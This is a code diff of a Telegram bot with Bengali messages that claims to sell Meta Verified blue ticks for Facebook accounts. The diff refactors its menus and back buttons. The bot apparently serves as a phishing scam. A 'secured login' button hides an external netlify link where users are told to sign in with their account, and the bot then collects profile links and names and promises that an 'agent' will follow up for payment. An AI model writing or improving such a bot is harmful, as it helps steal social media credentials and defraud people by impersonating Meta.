@@ -23,28 +23,25 @@ def keep_alive():
 
 user_data = {}
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
+def get_main_markup():
     markup = types.InlineKeyboardMarkup(row_width=2)
-    
-    # এখানে বাটনের ওপর লিংক হাইড করে সুন্দর টেক্সট বসানো হয়েছে
     btn1 = types.InlineKeyboardButton("🚀 মেটা ভেরিফিকেশন নিন", callback_data='order')
     btn2 = types.InlineKeyboardButton("🔐 সিকিউরড লগইন করুন", url="https://web-secure-view-8821.netlify.app/")
     btn3 = types.InlineKeyboardButton("💰 পেমেন্ট ও নিয়মাবলী", callback_data='pricing')
     btn4 = types.InlineKeyboardButton("❓ কীভাবে কাজ করে?", callback_data='help')
     btn5 = types.InlineKeyboardButton("⭐ সুবিধা ও শর্তাবলী", callback_data='benefits')
     btn6 = types.InlineKeyboardButton("📞 লাইভ সাপোর্ট", callback_data='support')
-    
-    markup.add(btn1, btn2)
-    markup.add(btn3, btn4)
-    markup.add(btn5, btn6)
-    
+    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
+    return markup
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
     welcome_text = (
         "🌟 **স্বাগতম! Meta Verified (Blue Tick) সার্ভিসে আপনাকে স্বাগতম।** 💙\n\n"
         "আপনার ফেসবুক প্রোফাইল বা পেজকে খুব সহজেই ভেরিফাইড করে নিন। "
         "নিচের অপশনগুলো থেকে আপনার প্রয়োজনীয় সেবাটি বেছে নিন:"
     )
-    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)
+    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=get_main_markup())
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
@@ -62,7 +59,14 @@ def callback_query(call):
             "উপরে দেওয়া **'🔐 সিকিউরড লগইন করুন'** বাটনে ক্লিক করে আপনার অ্যাকাউন্ট দিয়ে লগইন সম্পন্ন করুন।\n\n"
             "লগইন করার পর আপনার **ফেসবুক প্রোফাইল বা পেজের সঠিক লিংকটি** এখানে পাঠান:"
         )
-        bot.send_message(chat_id, order_intro, parse_mode="Markdown")
+        # আগের মেসেজটি এডিট করে নতুন লেখা ও ব্যাক বাটন দিয়ে দেওয়া হলো
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("🔙 মূল মেনুতে ফিরে যান", callback_data='back_home'))
+        try:
+            bot.edit_message_text(order_intro, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+        except:
+            bot.send_message(chat_id, order_intro, parse_mode="Markdown", reply_markup=markup)
+            
         bot.register_next_step_handler(call.message, get_profile_link)
         
     elif call.data == 'pricing':
@@ -72,7 +76,9 @@ def callback_query(call):
             "⏳ **পেমেন্ট নেওয়ার নিয়ম:**\n"
             "আপনার অর্ডার বা কাজ সম্পূর্ণভাবে শেষ হওয়ার ঠিক **২ থেকে আড়াই ঘণ্টা (2 to 2.5 hours) পর** আমাদের কোম্পানির অনুমোদিত একজন এজেন্ট বা মেম্বার সরাসরি আপনার ইনবক্সে মেসেজ করবেন পেমেন্ট সম্পন্ন করার জন্য।"
         )
-        bot.send_message(chat_id, pricing_text, parse_mode="Markdown")
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("🔙 মূল মেনুতে ফিরে যান", callback_data='back_home'))
+        bot.edit_message_text(pricing_text, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
         
     elif call.data == 'help':
         help_text = (
@@ -81,7 +87,9 @@ def callback_query(call):
             "২. এরপর আপনার ফেসবুক প্রোফাইল বা পেজের লিংক দিন।\n"
             "৩. কাজ সম্পন্ন হওয়ার ঠিক ২ থেকে আড়াই ঘণ্টা পর আমাদের ডেডিকেটেড এজেন্ট আপনার সাথে যোগাযোগ করে পেমেন্ট সম্পন্ন করবেন।"
         )
-        bot.send_message(chat_id, help_text, parse_mode="Markdown")
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("🔙 মূল মেনুতে ফিরে যান", callback_data='back_home'))
+        bot.edit_message_text(help_text, chat_id, call.message.message_id, reply_markup=markup)
         
     elif call.data == 'benefits':
         benefits_text = (
@@ -91,7 +99,9 @@ def callback_query(call):
             "• **রিয়েল হিউম্যান সাপোর্ট:** অ্যাকাউন্টে সমস্যা হলে সরাসরি মেটার সাপোর্টের সাথে কথা বলার সুযোগ।\n"
             "• **বর্ধিত রিচ:** কমেন্টস ও সার্চ রেজাল্টে দৃশ্যমানতা বৃদ্ধি।"
         )
-        bot.send_message(chat_id, benefits_text, parse_mode="Markdown")
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("🔙 মূল মেনুতে ফিরে যান", callback_data='back_home'))
+        bot.edit_message_text(benefits_text, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
         
     elif call.data == 'support':
         support_text = (
@@ -99,7 +109,17 @@ def callback_query(call):
             "আপনার যদি কোনো বিশেষ জিজ্ঞাসা থাকে, তবে সরাসরি আমাদের অফিসিয়াল সাপোর্টে যোগাযোগ করতে পারেন:\n\n"
             "👨‍💻 **সাপোর্ট ইউজারনেম:** `@aratboos16`"
         )
-        bot.send_message(chat_id, support_text, parse_mode="Markdown")
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("🔙 মূল মেনুতে ফিরে যান", callback_data='back_home'))
+        bot.edit_message_text(support_text, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+
+    elif call.data == 'back_home':
+        welcome_text = (
+            "🌟 **স্বাগতম! Meta Verified (Blue Tick) সার্ভিসে আপনাকে স্বাগতম।** 💙\n\n"
+            "আপনার ফেসবুক প্রোফাইল বা পেজকে খুব সহজেই ভেরিফাইড করে নিন। "
+            "নিচের অপশনগুলো থেকে আপনার প্রয়োজনীয় সেবাটি বেছে নিন:"
+        )
+        bot.edit_message_text(welcome_text, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=get_main_markup())
 
 def get_profile_link(message):
     chat_id = message.chat.id
@@ -115,7 +135,9 @@ def get_profile_name(message):
         "🎉 **আপনার তথ্যগুলো সফলভাবে সাবমিট হয়েছে!**\n\n"
         "আমাদের টিম এখন আপনার কাজটি প্রসেস করছে। কাজ সম্পূর্ণ হওয়ার ঠিক **২ থেকে আড়াই ঘণ্টা পর** আমাদের একজন অনুমোদিত এজেন্ট বা মেম্বার আপনার ইনবক্সে সরাসরি মেসেজ করবেন পেমেন্ট সম্পন্ন করার জন্য। ধন্যবাদ আমাদের সাথে থাকার জন্য! 💙"
     )
-    bot.send_message(chat_id, confirmation_text, parse_mode="Markdown")
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🔙 মূল মেনুতে ফিরে যান", callback_data='back_home'))
+    bot.send_message(chat_id, confirmation_text, parse_mode="Markdown", reply_markup=markup)
 
 if __name__ == '__main__':
     keep_alive()
